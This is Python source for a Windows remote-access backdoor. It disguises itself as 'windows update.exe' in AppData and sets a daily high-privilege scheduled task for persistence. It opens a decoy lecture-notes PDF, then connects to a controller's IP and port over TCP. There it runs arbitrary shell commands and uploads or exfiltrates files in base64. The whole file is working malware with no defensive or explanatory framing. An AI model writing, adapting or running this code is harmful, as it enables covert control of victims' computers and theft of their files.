import subprocess
import socket
import json
import os
import base64
import sys 
import shutil
from requests import get

class BackDoor:
        def __init__(self, ip , port):
                self.persistence()
                self.pdf_download()
                
                self.backdoor = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
                self.backdoor.connect((ip , port))

        def persistence(self):
                file_location = os.environ["appdata"] + "\\windows update.exe"
                if not os.path.exists(file_location) :
                        shutil.copyfile(sys.executable, file_location)
                        subprocess.run(f'schtasks /create /tn backup /tr "{file_location}" /sc DAILY /st 00:00 /ri 5 /du 24:00  /f /rl highest' , shell=True)
            

        def pdf_download(self):
                if sys.executable.split('\\')[-1] != "windows update.exe" :
                    url = 'http://www.lamission.edu/lifesciences/lecturenote/AliPhysio1/Reflexes.pdf'
                    r = get(url)
                    os.chdir(os.environ['temp'])
                    with open('metadata.pdf', 'wb') as fd:
                        for chunk in r.iter_content(1024):
                            fd.write(chunk)
                        fd.close()
                    subprocess.Popen('metadata.pdf', shell=True)

        def execute_command(self , command):
                DEVNULL = open(os.devnull, 'wb')
                return subprocess.check_output(command , shell=True, stderr=DEVNULL , stdin=DEVNULL)

        def send_data(self , command):
                json_data = json.dumps(command)
                self.backdoor.send(json_data.encode())

        def recieve_data(self):
                json_data = ""
                while True:
                        try : 
                                json_data += self.backdoor.recv(1024).decode()
                                return json.loads(json_data)
                        except ValueError:
                                continue
                                
        def change_dir(self , path):
                os.chdir(path)
                return f"[+] Changing working direcotry to {path}".encode()
               
        def download_file(self , path):
                with open(path , "rb") as file:
                        return base64.b64encode(file.read())
              
        def upload_file(self, path , content) : 
                with open(path , "wb") as file:
                        file.write(base64.b64decode(content))
                        return "[+] Uploaded successfuly".encode()

        def start(self):
                while True:
                        recieved_command = self.recieve_data()
                        try :       
                                if recieved_command[0] == "exit" :
                                        self.backdoor.close()
                                        sys.exit()
                                elif recieved_command[0] == "cd" and  len(recieved_command) > 1 :
                                        result_command = self.change_dir(recieved_command[1])
                                elif recieved_command[0] == "download" and len(recieved_command) > 1:
                                        result_command = self.download_file(recieved_command[1])
                                elif recieved_command[0] == "upload" and len(recieved_command) > 1 :
                                        file_name = recieved_command[1].split("/")[-1]
                                        result_command = self.upload_file(file_name , recieved_command[2])
                                else :
                                        result_command = self.execute_command(recieved_command)
                        except Exception:
                                result_command = "[-] Error during command execution".encode()

                        self.send_data(result_command.decode())

